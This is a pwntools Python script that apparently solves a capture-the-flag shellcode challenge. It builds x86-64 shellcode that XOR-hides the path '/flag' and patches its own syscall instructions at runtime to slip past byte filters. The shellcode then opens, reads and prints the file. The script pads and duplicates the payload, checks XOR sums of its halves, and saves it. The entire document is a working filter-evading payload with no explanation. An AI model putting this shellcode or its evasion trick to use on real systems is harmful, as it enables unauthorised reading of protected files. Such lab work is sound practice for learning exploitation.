from pwn import *

def xor(buffer):
    out = 0;
    for i in range(512):
        out ^= buffer[i]
    print(out)

shellcode = b"\x49\xB9\x01\x01\x01\x10\x10\x10\x10\x10\x49\xB8\x2E\x67\x6D\x71\x77\x10\x10\x10\x4D\x31\xC1\x41\x51\x6A\x02\x58\x4D\x31\xC0\x41\x50\x5E\x41\x50\x5A\x54\x5F\x4C\x8D\x25\xFF\xFF\xFF\x7F\x49\x81\xEC\xF4\xFF\xFF\x7F\x41\xFE\x04\x24\x0E\x05\x50\x5F\x4D\x31\xC0\x41\x50\x58\x54\x5E\x49\xC7\xC0\x01\x11\x01\x01\x49\x81\xF0\x10\x10\x01\x01\x41\x50\x5A\x4C\x8D\x25\xFF\xFF\xFF\x7F\x49\x81\xEC\xF4\xFF\xFF\x7F\x41\xFE\x04\x24\x0E\x05\x54\x5E\x6A\x01\x5F\x49\xC7\xC0\x01\x11\x01\x01\x49\x81\xF0\x10\x10\x01\x01\x41\x50\x5A\x6A\x01\x58\x4C\x8D\x25\xFF\xFF\xFF\x7F\x49\x81\xEC\xF4\xFF\xFF\x7F\x41\xFE\x04\x24\x0E\x05\x6A\x3C\x58\x4D\x31\xC0\x41\x50\x5F\x4C\x8D\x25\xFF\xFF\xFF\x7F\x49\x81\xEC\xF4\xFF\xFF\x7F\x41\xFE\x04\x24\x0E\x05"
shellcode += b'\x66' * (512 - len(shellcode))
shellcode += shellcode

print("=================================")
print(f"longitud payload  = {len(shellcode)}")
print("xor primera mitad =", end = " ")
xor(shellcode[:512])
print("xor segunda mitad =", end = " ")
xor(shellcode[512:])
print("=================================")

write("shellcodeFinal", shellcode)
